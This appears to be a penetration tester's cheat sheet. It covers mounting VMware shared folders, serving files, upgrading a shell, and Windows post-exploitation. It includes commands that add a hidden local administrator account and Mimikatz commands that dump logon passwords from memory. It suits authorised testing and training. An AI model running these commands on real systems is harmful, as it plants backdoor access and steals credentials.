### Linux VM - Mounting a Windows Share - Script ###
```
#!/bin/bash

vmware-hgfsclient | while read folder; do
  echo "[i] Mounting ${folder}   (/mnt/hgfs/${folder})"
  mkdir -p "/mnt/hgfs/${folder}"
  umount -f "/mnt/hgfs/${folder}" 2>/dev/null
  vmhgfs-fuse -o allow_other -o auto_unmount ".host:/${folder}" "/mnt/hgfs/${folder}"
done

sleep 2s
```


### Simple Web Servers

>python3 -m http.server

>python -m SimpleHTTPServer 80


### Shell Upgrade!

>python -c "import pty; pty.spawn('/bin/bash')"

>/bin/bash -i


### Post Exploitation

Add new user and add to local admin group

> net user gary password /add

> net localgroup administrators gary /add



## Get Passwords

> privilege::debug

> sekurlsa::logonpasswords

## Set GB keyboard in Linux
> setxkbmap -layout gb
